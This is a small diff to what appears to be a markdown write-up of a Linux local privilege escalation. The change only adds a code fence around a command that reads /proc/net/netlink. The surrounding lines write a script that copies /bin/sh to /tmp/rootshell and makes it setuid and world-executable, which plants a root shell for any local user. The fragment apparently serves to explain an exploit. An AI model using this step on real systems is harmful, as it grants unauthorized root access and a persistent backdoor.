@@ -273,6 +273,8 @@ echo '#!/bin/sh' > /tmp/run
 echo 'cp /bin/sh /tmp/rootshell && chmod 4777 /tmp/rootshell' >> /tmp/run
 chmod +x /tmp/run
 ```
+
+```
 cat /proc/net/netlink
 ```
 
